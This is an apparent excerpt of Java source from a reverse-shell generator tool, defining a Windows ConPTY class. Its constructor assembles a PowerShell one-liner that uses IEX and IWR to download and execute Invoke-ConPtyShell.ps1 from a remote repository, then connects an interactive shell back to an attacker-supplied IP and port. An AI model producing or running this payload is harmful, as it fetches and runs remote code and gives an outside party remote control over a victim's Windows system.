...
public class Windows_conpty extends Reverse {

    protected String shellFormat = "";

    public Windows_conpty(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell %s %s", this.getLocalIP(), this.getLocalPort());
    }
